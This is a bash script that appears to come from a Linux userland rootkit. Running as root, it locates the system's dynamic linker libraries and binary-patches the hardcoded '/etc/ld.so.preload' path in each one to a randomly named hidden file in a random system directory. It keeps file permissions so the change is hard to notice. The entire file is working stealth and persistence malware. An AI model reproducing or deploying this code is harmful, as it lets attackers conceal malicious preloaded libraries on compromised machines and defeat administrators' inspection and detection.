#!/bin/bash

[ $(id -u) != 0 ] && exit

O_PRELOAD="/etc/ld.so.preload" # change this at runtime if need be
LDIRS=("/lib/" "/lib/x86_64-linux-gnu/" "/lib/i386-linux-gnu/" "/lib32/" "/libx32/" "/lib64/")
PDIRS=("/bin/" "/sbin/" "/etc/" "/home/" "/lib/" "/libx32/" "/lib64/" "/opt/" "/usr/" "/var/")
LLOCS=() # later stores paths of dynamic linker libraries to patch

# return input '$1' as uppercase string of hex
hstr()
{
  local HS="`xxd -p <<< "$1"`"
  echo -n "${HS::-2}00" | awk '{print toupper($0)}'
}

# `gnpreload` uses this function to seek a home, for the npreload file, two directories deep
grecurdir()
{
    local cpdir="/notarealdir/"
    while [ ! -d "$cpdir" ]; do
        cpdir="${PDIRS[$RANDOM % ${#PDIRS[@]}]}"
        [ ! -d $cpdir ] && continue
        idirs="$(echo `ls -Ud ${cpdir}*/ 2>&1 | head -8`)" # list all directories inside the
                                                           # current directory and pipe stderr
                                                           # to stdout so we can read it below.
                                                           # only get the first 8 directories,
                                                           # so this part doesn't take forever
                                                           # on bigger directories.
        [[ "$idirs" == *"cannot access"* ]] && continue    # if the cur directory doesn't have
                                                           # any directories in it, go next dir.
        IFS=' ' read -a idir <<< "$idirs" # read the list of files into an array called idir
        cpdir="${idir[$RANDOM % ${#idir[@]}]}" # pick a random directory from the array
    done
    echo -n $cpdir
}

# builds new location string for the preload file.
gnpreload(){ echo -n "`grecurdir`.`cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 8 | head -n 1`"; }

gldlocs()
{
    for clib in ${LDIRS[*]}; do
        if [ -d "$clib" ]; then # lib directory exists
            xlib="${clib}*" # /DIRECTORY/*
            for l in $xlib; do # for every file in directory
                [[ $l == *"ld-2"* ]] && LLOCS+=($l) # add file to list if it is a dynamic linker library
            done
        fi
    done
}

# $1=target lib
# $2=o_preload
# $3=n_preload
patch_lib()
{
    local HO_PRELOAD="`hstr $2`" # hex our strings
    local HN_PRELOAD="`hstr $3`"

    # the new preload file string needs to be the same length as the old one,
    # so append nullbytes onto the end of it until it's the same length as the old string.
    while [ ${#HN_PRELOAD} != ${#HO_PRELOAD} ]; do HN_PRELOAD+="00"; done

    if [[ "`strings $1`" == *"$2"* ]]; then
        hexdump -ve '1/1 "%.2X"' $1 | sed "s/$HO_PRELOAD/$HN_PRELOAD/g" | xxd -r -p > $1.tmp
        chmod --reference $1 $1.tmp
        mv $1.tmp $1
    fi
}

N_PRELOAD="`gnpreload`" # generate new preload file location
gldlocs # get full paths of dl libs and store in array
for x in ${LLOCS[*]}; do # loop through array of dl libs and patch them
  patch_lib $x $O_PRELOAD $N_PRELOAD # patch current lib
done
echo -n $N_PRELOAD # output the new preload file location
